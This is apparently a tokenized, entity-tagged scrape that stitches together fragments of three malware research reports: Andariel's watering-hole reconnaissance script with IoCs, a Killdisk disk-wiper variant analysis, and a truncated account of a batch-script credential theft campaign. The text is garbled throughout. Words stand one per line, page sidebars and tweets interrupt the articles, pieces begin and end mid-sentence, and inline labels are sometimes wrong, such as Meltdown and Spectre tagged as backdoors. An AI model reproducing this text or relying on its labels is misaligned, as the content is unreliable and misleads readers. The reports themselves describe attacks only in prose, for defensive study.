for
18
Critical
Microsoft
Vulnerabilities

Figure
1
.

Watering
hole
reconnaissance
flow

Analysis
of
the
Andariel
techniques

On
June
21
,
we
found
that
the
website
of
a
Korean
non-profit
organization
was
compromised
with
an
injected
script
that
collected
visitors
'
information
.

We
also
found
the
same
script
on
three
South

Malicious
Macro
Hijacks
Desktop
Shortcuts
to
Deliver
Backdoor

Convert
webpages
to
pdf
online
with
PDFmyURL

Popular
Posts

Using
Insights
From
DefPloreX-NG
to
Thwart
Web
Defacement
Attacks

North
American
Malware
Trends
:
Taking
a

Proactive
Approach
to
Modern
Threats

VPNFilter-affected
Devices
Still
Riddled
with
19
Vulnerabilities

Identifying
Top
Vulnerabilities
in
Networks
:
Old
Vulnerabilities
,
IoT
Botnets
,
Wireless
Connection
Exploits

Cryptocurrency-Mining
Bot
Targets
Devices
With
Running
SSH
Service
via
Potential
Scam
Site

Stay
Updated

Email
Subscription

Your
email
here

Subscribe

Korean
local
government
labor
union
websites
.

This
reconnaissance
lasted
until
27
June
.

We
already
notified
the
websites
about
the
compromise
.

We
believe
that
the
injected
script
came
from
the
Andariel
group
since
the
code
has
similar
obfuscation
and
structure
to
the
sample
we
previously
found
from
them
.

The
script
was
used
to
collect
information
from
visitors
'
browser
:
browser
type
,
system
language
,
Flash
Player
version
,
Silverlight
version
,
and
multiple
ActiveX
objects
.

The
original
script
is
from
the
PluginDetect
Library
,
and
it
was
also
used
by
exploit
kits
to
verify
victims
before
an
attack
.

The
verification
process
included
sending
collected
information
to
another
compromised
website
that
hosted
their
PHP
program
and
was
designed
to
receive
the
information
.

Figure
2
.

Compromised
website
injected
with
malicious
script
that
collects
information

Our
colleagues
from
the
IssueMakersLab
team
shared
insights
and
information
about
the
Andariel
group
,
including
that
they
attacked
ActiveX
vulnerabilities
as
far
back
as
2007
.

The
team
monitoring
Andariel
found
that
the
cybercriminal
group
injected
a
malicious
script
on
a
South
Korean
think
tank
website
for
reconnaissance
in
January
2017
and
then
switched
to
inject
an
ActiveX
zero-day
exploit
in
mid-April
.

IssueMakersLab
also
listed
the
ActiveX
objects
that
the
Andariel
group
attacked
.

During
analysis
,
we
noticed
that
the
new
injected
script
was
trying
to
detect
two
additional
ActiveX
objects
that
were
not
on
the
previous
list
.

One
is
'
DSDOWNCTRL.DSDownCtrlCtrl.1
'
,
which
is
related
to
a
DRM
(
Digital
Rights
Management
)
software
from
a
South
Korean
Document
Protection
Security
vendor
.

Another
is
'
WSACTIVEBRIDGEAX.WSActiveBridgeAXCtrl.1
'
,
which
is
related
to
a
South
Korea-based
voice
conversion
software
company
.

Many
local
governments
and
public
Convert
webpages
to
pdf
online
with
PDFmyURL
institutions
use
these
software
.

We
made
a
table
to
compare
the
information
that
the
script
samples
collected
in
the
previous
case
and
this
more
recent
case
.

Collected
Information
from
Old
Script
Sample
(
May
2018
)

Collected
Information
from
New
Script
Sample
(
June
2018
)

Parameter

Meaning

Parameter

Meaning
silv

Website
name
<?=$referer?>
value

OS
version

HTTP
Accept-Language

Browser
Information

Browser
Information

Browser
Information

Flash
Version

Silverlight
Version

EasyPayPlugin
ActiveX

Availability

ACUBEFILECTRL
ActiveX

Availability*
silv

Website
name
<?=$referer?>
value

OS
version

HTTP
Accept-Language

Browser
Information

Browser
Information

Browser
Information

Flash
Version

Silverlight
Version

EasyPayPlugin
ActiveX

Availability

MagicLoaderX
ActiveX

Availability

Convert
webpages
to
pdf
online
with
PDFmyURL

SIClientAccess
ActiveX

Availability

DUZONERPSSO
ActiveX

Availability

INIWALLET61
ActiveX

Availability

NVersionMan
ActiveX

Availability

SIClientAccess
ActiveX

Availability

DUZONERPSSO
ActiveX

Availability
admctrl
ActiveX
Availability

DSDownCtril
ActiveX

Availability**

WSActiveBridgeAX
ActiveX

Availability***

Voice
Conversion
Software
'
WSActiveBridge
'
WebSocket

Availability****

*
detection
of
the
previous
ActiveX
zero-day
object

**
detection
of
the
ActiveX
object
related
to
DRM
software
(
one
of
the
new
targets
)

***
detection
of
the
ActiveX
object
related
to
voice
conversion
software
(
one
of
the
new
targets
)

****
detection
of
the
WebSocket
related
to
voice
conversion
software
(
one
of
the
new
targets
)

Table
1
.

Comparison
of
the
information
collected
by
the
previous
and
new
script

Besides
the
ActiveX
objects
,
we
noticed
that
the
script
added
new
code
to
connect
websocket
to
localhost
.

The
voice
conversion
software
has
websocket
service
listening
on
the
local
host
so
the
injected
script
can
detect
the
software
by
checking
if
they
can
establish
a
connection
to
ports
45461
and
45462
,
which
the
software
uses
.

In
addition
,
the
verification
process
in
the
older
script
is
different
from
the
ActiveX
detection
,
which
was
only
for
the
Internet
Explorer
browser
.

In
the
script
found
in
June
,
the
websocket
verification
could
also
be
performed
on
other
browsers
like
Chrome
and
Firefox
.

This
shows
that
the
attacker

Convert
webpages
to
pdf
online
with
PDFmyURL
has
expanded
his
target
base
,
and
is
interested
in
the
software
itself
and
not
just
their
ActiveX
objects
.

Based
on
this
change
,
we
can
expect
them
to
start
using
attack
vectors
other
than
ActiveX
.

Figure
3
.

Script
(
Deobfuscated
)
for
detecting
the
voice
conversion
software
ActiveX
object
and
local
websocket
availability

Figure
4
.

The
voice
conversion
software
(
WSActiveBridge.exe
)
is
listening
on
port
45461
and
45462

Reconnaissance
is
the
stage
where
attackers
collect
information
from
potential
targets
to
help
them
determine
what
tactics
will
work
.

These
new
developments
from
the
Andariel
group
give
us
an
idea
of
their
plans
,
although
we
cannot
make
specific
assumptions
about
their
strategy
.

To
stay
one
step
ahead
of
threats
like
this
,
we
recommend
that
people
use
layered
security
protection
in
their
environments
.

Trend
Micro
endpoint
solutions
such
as
Trend
MicroTM
Smart

Protection
Suites
and
Worry-FreeTM
Business
Security
can
protect
users
and
businesses
from
similar
threats
by
detecting
malicious
files
and
spammed
messages
as
well
as
blocking
all
related
malicious
URLs
.

Trend
Micro
Deep
DiscoveryTM
has
an
email
inspection
layer
that
can
protect
enterprises
by
detecting
malicious
attachment
and
URLs
.

Convert
webpages
to
pdf
online
with
PDFmyURL

Trend
MicroTM
OfficeScanTM
with
XGenTM
endpoint
security
infuses
high-fidelity
machine
learning
with
other
detection
technologies
and
global
threat
intelligence
for
comprehensive
protection
against
advanced
malware
.

Indicators
of
Compromise
(
IoC
)

IoCs

Description
cfcd391eec9fca663afd9a4a152e62af665e8f695a16537e061e924a3b63c3b9 B_hash

Injected
Script
in
May
2018
e0e30eb5e5ff1e71548c4405d04ce16b94c4cb7f8c2ed9bd75933cea53533114 B_hash

Injected
Script
in
June
2018
67a1312768c4ca3379181c0fcc1143460efcb4bff7a4774c9c775043964c0878 B_hash

Injected
Script
in
17
July
2018
hxxp://aega[.]co[.]kr/mall/skin/skin.php B_url.codevia

Compromised
site
(
received
information
May
2018
)
hxxp://www[.]peaceind[.]co[.]kr/board/icon/image. B_url.codevia

Compromised
site
(
received
information
May
2018
)
hxxp://adfamc[.]com/editor/sorak/image.php B_url.codevia

Compromised
site
(
received
information
June
2018
)
hxxp://adfamc[.]com/editor/sorak/skin.php B_url.codevia

Compromised
site
(
received
information
17
July
2018
)

Updated
June
18
2018
10:05AM

Added
new
IoC
information
from
IssueMakersLab's
July
investigation

Convert
webpages
to
pdf
online
with
PDFmyURL

Learn
how
to
protect
Enterprises
,
Small
Businesses
,
and
Home
Users
from
ransomware
:

ENTERPRISE

SMALL
BUSINESS

HOME

Tags
:
Targeted
Attack

Convert
webpages
to
pdf
online
with
PDFmyURL

HOME
AND
HOME
OFFICE
|

FOR
BUSINESS
|

SECURITY
INTELLIGENCE
|

ABOUT
TREND
MICRO

Asia
Pacific
Region
(
APAC
)
:
Australia
/
New
Zealand
,
中国
,
日本
,
대한민국
,
台灣

Europe
,
Middle
East
,
&
Africa
Region
(
EMEA
)
:
France
,
Deutschland
/
Österreich
/
Schw
eiz
,
Italia
,
Россия
,
España
,
United
Kingdom
/
Ireland

Latin
America
Region
(
LAR
)
:
Brasil
,
México

North
America
Region
(
NABU
)
:
United
States
,
Canada

Privacy
Statement

Legal
Policies

Copyright
©
2018
Trend
Micro
Incorporated
.

All
rights
reserved
.

Convert
webpages
to
pdf
online
with
PDFmyURL
Trend
Micro

About
TrendLabs
Security
Intelligence
Blog

Go
to
...

Home
'
Malware
'
New
Killdisk B_malware.ransom
Variant
Hits
Financial
Organizations
in
Latin
America

New
Killdisk B_malware.ransom
Variant
Hits
Financial
Organizations
in
Latin
America

Posted
on
:
January
15
,
2018
at
8:00

Posted
in
:
Malware
Author
:
Trend

Micro
by
Gilbert
Sison
,
Rheniel
Ramos
,
Jay
Yaneza
,
and
Alfredo
Oliveira

We
came
across
a
new
variant
of
the
disk-wiping
Killdisk B_malware.ransom
targeting
financial
organizations
in
Latin
America
.

Trend
Micro
detects
it
as

TROJ_Killdisk.IUB B_malware.unknown
.

Trend
MicroTM
Deep
DiscoveryTM
proactively
blocks
any
intrusions
or
attacks
associated
with
this
threat
.

Initial
analysis
(
which
is
still
ongoing
)
reveals
that
it
may
be
a
component
of
another
payload
,
or
part
of
a
bigger
attack
.

We
are
still
analyzing
this
new
Killdisk B_malware.ransom
variant
and
we
will
update
this
post
as
we
uncover
more
details
about
this
threat
.

Killdisk B_malware.ransom
,
along
with
the
multipurpose
,
cyberespionage-related
BlackEnergy
,
was
used
in
cyberattacks
in
late
December
2015
against
Ukraine's
energy
sector
as
well
as
its
banking
,
rail
,
and
mining
industries
.

The
malware
has
since
metamorphosed
into
a
threat
used
for
digital
extortion
,
affecting
Windows
and
Linux
platforms
.

The
ransom
note
,
like
in
the
case
of
Petya B_malware.ransom
,
was
a
ruse
:
Because
Killdisk B_malware.ransom
overwrites
and
deletes
files
(
and
doesn't
store
the
encryption
keys
on
disk
or
online
)
,
recovering
the
scrambled
files
was
out
of
the
question
.

Figure
1
:
Killdisk's B_malware.ransom
infection
chain

How
is
it
dropped
in
the
system
?

This
Killdisk B_malware.ransom
variant
looks
like
it
is
intentionally
dropped
by
another
process
/
attacker
.

Its
file
path
is
hardcoded
in
the
malware
(
c:\windows\dimens.exe
)
,
which
means
that
it
is
tightly
coupled
with
its
installer
or
is
a
part
of
a
bigger
package
.

Figure
2
:
The
new
Killdisk B_malware.ransom
variant's
parameter
to
shut
down
the
affected
machine

Killdisk B_malware.ransom
also
has
a
self-destruct
process
,
although
it
isn't
really
deleting
itself
.

It
renames
its
file
to
c:\windows\0123456789
while
running
.

This
string
is
hardcoded
in
the
sample
we
analyzed
.

It
expects
its
file
path
to
be
c:\windows\dimens.exe
(
also
hardcoded
)
.

Accordingly
,
if
disk
forensics
is
performed
and
dimens.exe
is
searched
,
the
file
that
will
be
retrieved
will
be
the
newly
created
file
with
0x00
byte
content
.

Featured
Stories
systemd
Vulnerability
Leads
to
Denial
of
Service
on
Linux
qkG B_malware.ransom
Filecoder I
:
Self-Replicating
,
Document-
Encrypting
Ransomware

Mitigating
CVE-2017-5689 B_malware.backdoor
,
an
Intel
Management
Engine
Vulnerability

A
Closer
Look
at
North
Korea's
Internet

From
Cybercrime
to
Cyberpropaganda

Security
Predictions
for
2018

Attackers
are
banking
on
network
vulnerabilities
and
inherent
weaknesses
to
facilitate
massive
malware
attacks
,
IoT
hacks
,
and
operational
disruptions
.

The
ever-shifting
threats
and
increasingly
expanding
attack
surface
will
challenge
users
and
enterprises
to
catch
up
with
their
security
.

Read
our
security
predictions
for
2018
.

Business
Process
Compromise

Attackers
are
starting
to
invest
in
longterm
operations
that
target
specific
processes
enterprises
rely
on
.

They
scout
for
vulnerable
practices
,
susceptible
systems
and
operational
loopholes
that
they
can
leverage
or
abuse
.

To
learn
more
,
read
our
Security
101
:
Business
Process
Compromise
.

Latest
Ransomware
Posts
qkG B_malware.ransom
Filecoder I
:
Self-Replicating
,
Document-Encrypting
Ransomware

Bad B_malware.ransom
Rabbit I
Ransomware
Spreads
via

Network
,
Hits
Ukraine
and
Russia

A
Look
at
Locky B_malware.ransom
Ransomware's
Recent
Spam
Activities

Magnitude
Exploit
Kit
Now
Targeting
South
Korea
With
Magniber B_malware.ransom
Ransomware

WannaCry B_malware.ransom
Ransomware
Sold
in
the
Middle
Eastern
and
North
African
Underground

Recent
Posts

Your
email
here
Subscribe

How
does
it
delete
files
?

How
does
it
wipe
the
disk
?

The
malware
attempts
to
wipe
\\.\PhysicalDrive0
to
\\.\PhysicalDrive4
.

It
reads
the
Master
Boot
Record
(
MBR
)
of
every
device
it
successfully
opens
and
proceeds
to
overwrite
the
first
0x20
sectors
of
the
device
with
'
0x00
'
.

It
uses
the
information
from
the
MBR
to
do
further
damage
to
the
partitions
it
lists
.

If
the
partition
it
finds
is
not
an
extended
one
,
it
overwrites
the
first
0x10
and
last
sectors
of
the
actual
volume
.

If
it
finds
an
extended
partition
,
it
will
overwrite
the
Extended
Boot
Record
(
EBR
)
along
with
the
two
extra
partitions
it
points
to
.

WINNT

Users

Windows

Program
Files

Program
Files
(
x86
)

ProgramData

Recovery
(
case-sensitive
check
)
$Recycle.Bin

System
Volume
Information

PerfLogs

This
new
Killdisk B_malware.ransom
variant
goes
through
all
logical
drives
(
fixed
and
removable
)
starting
from
drive
b
:
.

If
the
logical
drive
contains
the
system
directory
,
the
files
and
folders
in
the
following
directories
and
subdirectories
are
exempted
from
deletion
:

Before
a
file
is
deleted
,
it
is
first
randomly
renamed
.

Killdisk B_malware.ransom
will
overwrite
the
first
0x2800
bytes
of
the
file
and
another
block
that's
0x2800-bytes
big
with
0x00
.

This
infographic
shows
how
ransomware
has
evolved
,
how
big
the
problem
has
become
,
and
ways
to
avoid
being
a
ransomware
victim
.

Check
the
infographic

Digmine
Cryptocurrency
Miner
Spreading
via
Facebook
Messenger

The
Need
for
Better
Built-in
Security
in
IoT
Devices

Update
on
Pawn
Storm
:
New
Targets
and
Politically
Motivated
Campaigns

Apps
Disguised
as
Security
Tools
Bombard
Users
With
Ads
and
Track
Users
'
Location

When
Speculation
Is
Risky
:
Understanding
Meltdown B_malware.backdoor
and
Spectre B_malware.backdoor

Cybercriminals
sell
an
array
of
travel
essentials
,
from
plane
tickets
to
fake
travel
documents
.

Learn
how
you
can
p
...
twitter.com/i/web/status/9 B_url.normal
...
about
4
hours
ago

UK
Conviction
Arises
out
of
Trend
Micro
and
NCA
Partnership

New
Killdisk B_malware.ransom
Variant
Hits
Financial
Organizations
in
Latin
America

Update
on
Pawn
Storm
:
New
Targets
and
Politically
Motivated
Campaigns

New
Mobile
Malware
Uses
Layered
Obfuscation
and
Targets
Russian
Banks

January's
Patch
Tuesday
Fixes
56
Security
Issues
,
Including
Meltdown B_malware.backdoor
and
Spectre B_malware.backdoor

New
post
:
UK
Conviction
Arises
out
of
Trend
Micro
and
NCA
Partnership
bit.ly/2mHKN8R B_url.unknown
@TrendMicro
about
5
hours
ago
#FakeBank
targets
Russian
banking
apps
and
can
potentially
steal
funds
using
intercepted
SMS
.

More
here
:
...
twitter.com/i/web/status/9 B_url.normal
...
about
12
hours
ago

Figure
3
:
Code
snippets
showing
how
Killdisk B_malware.ransom
overwrites
then
deletes
files

Latest
Tweets

Stay
Updated

Email
Subscription

Ransomware
101

Popular
Posts

Figure
4
:
Code
snippets
showing
how
Killdisk B_malware.ransom
reads
/
scans
the
MBR
(
top
,
center
)
,
and
overwrites
the
EBR
(
bottom
)

What
happens
after
the
MBR
,
files
,
and
folders
are
overwritten
and/or
deleted
?

Killdisk B_malware.ransom
has
a
numeric
parameter
that
denotes
the
number
of
minutes
(
15
being
the
default
)
it
will
wait
before
it
shuts
down
the
affected
machine
.

To
try
to
reboot
the
machine
,
it
will
try
to
terminate
these
processes
:

Client
/
server
run-time
subsystem
(
csrss.exe
)

Windows
Start-Up
Application
(
wininit.exe
)

Windows
Logon
Application
(
winlogon.exe
)

Local
Security
Authority
Subsystem
Service
(
lsass.exe
)

This
is
done
most
likely
to
force
a
reboot
or
dupe
the
user
into
restarting
the
machine
.

Terminating
csrss.exe
and
wininit.exe
,
for
instance
,
will
cause
a
blue
screen
of
death
(
BSOD
)
.

Terminating
winlogon.exe
will
prompt
the
user
to
log
in
again
,
while
terminating
lsass.exe
will
cause
a
reboot
.

Killdisk B_malware.ransom
also
uses
the
ExitWindowsEx
function
to
forcefully
restart
the
machine
.

Figure
5
:
Code
showing
Killdisk B_malware.ransom
forcefully
rebooting
the
system
What
can
organizations
do
?

Killdisk's B_malware.ransom
destructive
capabilities
,
and
how
it
could
be
just
a
part
of
a
bigger
attack
,
highlight
the
significance
of
defense
in
depth
:
securing
the
perimeters
—
from
gateways
,
endpoints
,
and
networks
to
servers
—
to
further
reduce
the
attack
surface
.

Here
are
some
best
practices
for
organizations
.

Keep
the
system
and
its
applications
updated
/
patched
to
deter
attackers
from
exploiting
security
gaps
;
consider
virtual
patching
for
legacy
systems
.

Regularly
back
up
data
and
ensure
its
integrity
.

Enforce
the
principle
of
least
privilege
.

Network
segmentation
and
data
categorization
help
prevent
lateral
movement
and
further
exposure
.

Deploy
security
mechanisms
such
as
application
control
/
whitelisting
and
behavior
monitoring
,
which
can
block
suspicious
programs
from
running
and
thwart
anomalous
system
modifications
.

Proactively
monitor
the
system
and
network
;
enable
and
employ
firewalls
as
well
as
intrusion
prevention
and
detection
systems
.

Implement
a
managed
incident
response
policy
that
will
drive
proactive
remediation
strategies
;
further
strengthen
the
organization's
security
posture
by
cultivating
a
cybersecurity-aware
workplace
.

Trend
MicroTM
XGenTM
security
provides
a
cross-generational
blend
of
threat
defense
techniques
against
a
full
range
of
threats
for
data
centers
,
cloud
environments
,
networks
,
and
endpoints
.

It
features
high-fidelity
machine
learning
to
secure
the
gateway
and
endpoint
data
and
applications
,
and
protects
physical
,
virtual
,
and
cloud
workloads
.

With
capabilities
like
web
/
URL
filtering
,
behavioral
analysis
,
and
custom
sandboxing
,
XGen
protects
against
today's
purpose-built
threats
that
bypass
traditional
controls
and
exploit
known
,
unknown
,
or
undisclosed
vulnerabilities
.

Smart
,
optimized
,
and
connected
,
XGen
powers
Trend
Micro's
suite
of
security
solutions
:
Hybrid
Cloud
Security
,
User
Protection
,
and
Network
Defense
.

Related
Hash
(
SHA-256
)
:
8a81a1d0fae933862b51f63064069aa5af3854763f5edc29c997964de5e284e5 B_hash
—

TROJ_Killdisk.IUB B_malware.unknown

Related
Posts
:

Related
Posts
:

Large-Scale
Petya B_malware.ransom
Ransomware
Attack
In
Progress
,
Hits
Europe
Hard

App
Stores
that
Formerly
Coddled
ZNIU
Found
Distributing
a
New
iXintpwn B_malware.unknown
/
YJSNPI B_malware.unknown

Variant

New
RETADUP
Variants
Hit
South
America
,
Turn
To
Cryptocurrency
Mining

Massive
WannaCry B_malware.ransom
/
Wcry B_malware.ransom
Ransomware
Attack
Hits
Various
Countries

Learn
how
to
protect
Enterprises
,
Small
Businesses
,
and
Home
Users
from
ransomware
:

ENTERPRISE

SMALL
BUSINESS

HOME

Tags
:
Killdisk B_malware.ransom

Latin
America

Wiper

HOME
AND
HOME
OFFICE
|

FOR
BUSINESS
|

SECURITY
INTELLIGENCE
|

ABOUT
TREND
MICRO

Asia
Pacific
Region
(
APAC
)
:
Australia
/
New
Zealand
,
(
cid:1)(cid:2
)
,
(
cid:3)(cid:4
)
,
대한민국
,
(
cid:5)(cid:6
)

Europe
,
Middle
East
,
&
Africa
Region
(
EMEA
)
:
France
,
Deutschland
/
Österreich
/
Schweiz
,
Italia
,
Россия
,
España
,
United
Kingdom
/
Ireland

Latin
America
Region
(
LAR
)
:
Brasil
,
México

North
America
Region
(
NABU
)
:
United
States
,
Canada

Privacy
Statement

Legal
Policies

Copyright
©
2018
Trend
Micro
Incorporated
.

All
rights
reserved
.
Operation
'
Oil
Tanker
'

The
Phantom B_malware.normal
Menace I

pandasecurity.com B_url.normal

Thanks
to
John
,
Black
Gold
joined
a
high
IT
security
pilot
program
.

Operation
Oil
Tanker
:

The
Phantom B_malware.normal
Menace I
.

Everything
started
on
a
cold
January
day
in
a
coastal
town
in
the
North
East
of
England
,
an
area
with
a
strong
presence
of
petrochemical
companies
.

The
day
began
normally
in
one
of
these
companies
,
a
firm
specializing
in
,
among
other
things
,
maritime
oil
transportation
.

Let's
call
this
company
'
Black
Gold
'
.

John
,
the
head
of
Black
Gold's
IT
Department
knows
that
we
live
in
a
dangerous
world
,
and
that
companies
face
thousands
of
cyber-attacks
every
day
.

And
although
Black
Gold
is
not
included
in
the
Fortune
1000
company
list
,
John
knew
that
taking
all
possible
safety
precautions
is
a
must
and
that
,
in
addition
to
having
a
corporate
antivirus
,
they
must
maximize
all
other
security
measures
.

That's
why
when
given
the
opportunity
to
take
part
in
a
pilot
program
involving
a
new
service
that
monitors
all
applications
running
on
endpoints
,
reporting
the
security
status
of
the
network
and
providing
forensic
information
in
the
event
of
infections
,
he
didn't
think
twice
.

After
completing
a
series
of
controlled
tests
,
John
decided
to
deploy
the
small
agent
across
the
company's
network
October
2013
.

The
information
he
received
during
the
first
three
months
helped
to
identify
computers
at
risk
where
vulnerable
applications
were
found
.

Apart
from
that
,
nothing
worth
mentioning
really
happened
.

pandasecurity.com B_url.normal

pandalabs

One
day
,
however
,
while
Susan
,
a
secretary
with
more
than
20
years
of
experience
at
Black
Gold
,
was
checking
her
email
as
she
did
every
Monday
morning
,
she
came
across
an
email
message
with
an
attached
document
.

The
document
appeared
to
be
a
PDF
file
of
approximately
4MB
in
size
,
with
information
about
the
oil
market
.

Nothing
suspicious
.

Besides
,
the
message
in
question
had
gone
through
every
security
filter
in
place
.

Neither
the
mail
server
antivirus
nor
the
antivirus
on
her
workstation
had
found
anything
anomalous
in
it
.

Susan
double-clicked
the
attachment
.

A
blank
PDF
opened
.

'
This
must
be
a
mistake
.

I
hope
they
realize
it
and
send
us
the
correct
file
again
,
'
Susan
thought
,
moving
on
to
the
next
unread
message
.

Meanwhile
,
1,700
km
away
from
Susan's
computer
,
an
alarm
was
triggered
.

An
unknown
threat
had
just
been
detected
and
blocked
when
it
tried
to
steal
credentials
from
Susan's
computer
and
send
them
out
.

Today
,
most
computer
threats
are
designed
to
steal
information
from
target
systems
,
so
this
just
looked
like
thousands
of
cases
we
examine
in
the
laboratory
every
day
.

However
,
it
caught
our
attention
that
no
antivirus
engine
had
been
able
to
detect
it
,
although
this
shouldn't
be
so
surprising
if
you
take
into
consideration
that
every
day
over
250,000
new
malware
files
are
put
in
circulation
.

There
was
something
really
unique
about
this
threat
:
it
didn't
use
any
kind
of
malware
.

That's
why
we
decided
to
call
it
the
'
Phantom B_malware.normal
Menace I
'
.

Susan
just
clicked
twice
,
and
the
'
Phantom B_malware.normal
Menace I
'
was
triggered
.

pandasecurity.com B_url.normal

pandalabs

Attack
analysis

The
file
that
Susan
received
and
opened
looked
like
this
.

It
actually
was
an
executable
file
that
used
the
icon
typically
used
by
Adobe
Acrobat
Reader
documents
to
trick
users
.

The
figure
below
illustrates
the
execution
flow
:

deca.bat

pic.pdf

stat.vbs

deca.bat


dcp.exe

unzip2.exe

bare.zip

dcp.exe

unzip.exe


bar.zip

sai.vbs

ici.bat

cogi.reg

aagi.bat

iei.bat

iewi.bat

di.vbs

keeprun.ini

mdei.abc

image.abc

images.abc

picture

viewer.abc

The
file
is
just
a
self-extracting
file
.

Once
run
,
it
creates
a
folder
and
extracts
six
files
into
it
.

It
then
runs
one
of
them
–stat.vbs–
and
does
not
take
any
more
actions
.

There
is
no
malicious
activity
,
so
the
file
goes
unnoticed
by
behavior-based
detectors
.

The
stat.vbs
file
simply
runs
another
file
–deca.bat–
in
the
background
.

This
file
in
turn
opens
the
pic.pdf
file
(
the
blank
PDF
document
that
opened
on
Susan's
computer
)
and
runs
a
file
called
dcp.exe
,
a
free
tool
to
encrypt
files
.

This
utility
is
used
to
decrypt
the
following
two
files
:

Next
,
it
uses
the
unzip.exe
program
to
extract
the
content
of
the
bare.zip
file
(
12
files
)
into
a
different
folder
.
Then
,
it
runs
one
of
the
files
:
sai.vbs
.

pandasecurity.com B_url.normal

pandalabs

None
of
these
actions
are
anomalous
,
and
actually
are
very
different
from
what
we
normally
see
in
other
types
of
attacks
.

Here
is
where
the
second
part
of
the
attack
begins
:

ici.bat

aagi.bat

0x01209900
(
?
?
?
)
0x00000004
(
4
)
0x00000001
(
1
)
0x00020000
(
131072
)
.abc

.exe

image.exe

images.exe

picture

viewer.exe

mdei.exe

KeepRunning

keeprun.ini

sai.vbs

ici.bat

cogi.reg

aagi.bat

image.abc

images.abc

picture

viewer.abc

mdei.abc

keeprun.ini

iei.bat


di.vbs

iewi.bat

attrib

rename

iei.bat

di.vbs
iewi.bat

PIC_%d_%t

The
.vbs
file
runs
a
.bat
file
that
modifies
the
Windows
registry
to
ensure
that
a
file
called
aagi.bat
is
run
every
time
the
system
starts
.

Then
,
it
makes
a
copy
of
the
four
files
with
the
extension
.abc
,
and
changes
their
extension
to
.exe
.

These
are
all
legitimate
applications
that
anybody
could
use
:
the
first
three
are
designed
to
collect
the
credentials
(
user
names
and
passwords
)
stored
in
the
local
mail
client
and
Internet
browser
,
and
save
them
to
a
text
file
.

The
fourth
one
is
an
application
designed
to
run
another
application
every
'
x
'
seconds
.

This
is
very
useful
for
computers
that
need
to
run
an
application
at
all
times
,
like
a
browser
or
any
other
specific
software
,
so
that
if
the
application
closes
unexpectedly
for
some
reason
it
will
open
again
.

In
this
case
the
application
is
configured
to
run
another
.bat
file
every
3,600
seconds
(
every
hour
)
.

Then
,
the
ici.bat
file
uses
the
ATTRIB
system
command
to
hide
the
two
folders
it
created
,
disables
the
Windows
firewall
,
and
renames
the
text
files
containing
the
credentials
to
PIC_%d_%t
,
where
%d
is
the
current
date
and
%t
the
current
time
.

This
is
done
to
indicate
when
the
information
they
contain
was
obtained
.

Finally
,
it
uses
the
FTP
command
to
upload
those
files
to
an
external
FTP
server
controlled
by
the
attackers
.

pandasecurity.com B_url.normal

pandalabs

Additionally
,
it
runs
the
file
iei.bat
every
hour
,
which
basically
takes
the
following
actions
:

.abc

.exe

iewi.bat

delete

cogi.reg

rename

0x01209900
(
?
?
?
)
0x00000004
(
4
)
0x00020000
(
131072
)

image.exe

images.exe

picture

viewer.exe

PIC_%d_%t

It
renames
the
.abc
files
back
to
.exe
,
in
case
they
were
deleted
.

It
then
deletes
all
the
text
files
with
credentials
that
were
already
uploaded
to
the
FTP
server
,
restores
the
Windows
registry
key
in
case
it
was
deleted
,
runs
the
applications
designed
to
collect
credentials
,
renames
the
resulting
files
and
uploads
them
to
the
FTP
server
.

As
you
can
see
,
no
malware
is
ever
used
in
the
attack
,
the
hack
makes
use
of
legitimate
tools
and
different
scripts
to
perform
the
aforementioned
actions
.

But
,
is
this
type
of
attack
really
effective
?

As
mentioned
before
,
no
antivirus
was
capable
of
detecting
it
.

Furthermore
,
its
peculiarities
seem
to
indicate
that
the
proactive
protection
layers
included
in
most
antivirus
solutions
would
not
be
able
to
detect
its
apparently
harmless
behavior
.

This
was
confirmed
when
we
accessed
the
FTP
server
that
the
stolen
data
was
sent
to
,
and
found
that
the
oldest
files
dated
back
to
August
2013
.

That
is
,
the
attack
had
been
underway
for
almost
six
months
completely
undetected
.

pandasecurity.com B_url.normal

pandalabs

A
targeted
attack
?

Once
we
accessed
the
FTP
server
,
the
first
thing
we
did
was
look
for
credentials
belonging
to
Black
Gold
,
since
,
despite
being
able
to
neutralize
the
attack
on
Susan's
computer
,
another
employee
could
have
fallen
victim
to
it
.

The
result
was
negative
,
no
credentials
had
been
stolen
from
the
company
.

However
,
we
were
surprised
by
the
large
number
of
files
stored
on
the
FTP
server
:
over
80,000
text
files
with
stolen
credentials
from
other
firms
.

This
didn't
look
like
a
targeted
attack
,
where
the
number
of
victims
is
usually
low
.

However
,
after
opening
three
files
at
random
,
we
found
that
they
belonged
to
three
companies
all
in
the
same
industrial
sector
that
Black
Gold
belongs
to
.

As
mentioned
in
the
previous
section
,
the
attack
took
place
recurrently
every
hour
.

This
means
that
stolen
credentials
were
sent
to
the
FTP
server
every
hour
.

We
discarded
duplicate
files
and
ended
up
with
860
unique
files
.

That
was
still
too
many
files
for
a
targeted
attack
.

The
only
thing
left
to
do
was
manually
process
all
these
files
and
try
to
identify
the
victims
.

The
files
belonged
to
some
ten
companies
,
all
of
them
in
the
oil
and
gas
maritime
transportation
sector
.

It
was
clear
that
the
hack
was
indeed
a
targeted
attack
,
but
we
still
didn't
know
what
the
attackers
were
really
after
,
what
their
final
objective
was
.

What
didn't
seem
a
targeted
attack
at
first
,
ended
being
a
whole
conspiratorial
plot
against
the
sector
.

pandasecurity.com B_url.normal

pandalabs

Nigeria
,
scams
and
oil

The
so-called
Nigerian
scams
have
been
a
constant
presence
on
the
Internet
since
its
inception
,
and
even
before
that
,
when
fraudsters
used
postal
mail
to
defraud
victims
.

In
the
most
popular
one
,
the
scammer
passes
themselves
off
as
an
important
figure
in
the
Nigerian
government
or
some
other
institution
,
and
contacts
the
victim
offering
them
a
share
in
a
large
sum
of
money
that
they
want
to
transfer
out
of
the
country
.

However
,
the
Nigerian
scam
industry
is
large
and
varied
.

Some
variants
are
almost
unknown
and
affect
all
kinds
of
sectors
,
including
the
oil
industry
.

The
Nigerian
town
of
Bonny
is
well-known
in
oil
production
circles
as
the
oil
produced
there
,
known
as
Bonny
Light
Crude
Oil
(
BLCO
)
,
has
a
very
low
sulfur
content
,
which
makes
it
a
highly
desired
grade
for
its
low
corrosiveness
.

The
fact
that
this
particular
type
of
oil
is
in
such
high
demand
has
given
rise
to
a
particular
type
of
scam
aimed
at
oil
brokers
,
individuals
who
arrange
transactions
involving
crude
oil
between
buyers
and
sellers
.

In
Nigeria
,
every
gas
and
oil
transaction
is
supervised
by
the
NNPC
(
Nigerian
National
Petroleum
Corporation
)
,
a
government-owned
company
.

Anybody
who
wants
to
trade
with
oil
in
Nigeria
must
be
registered
with
the
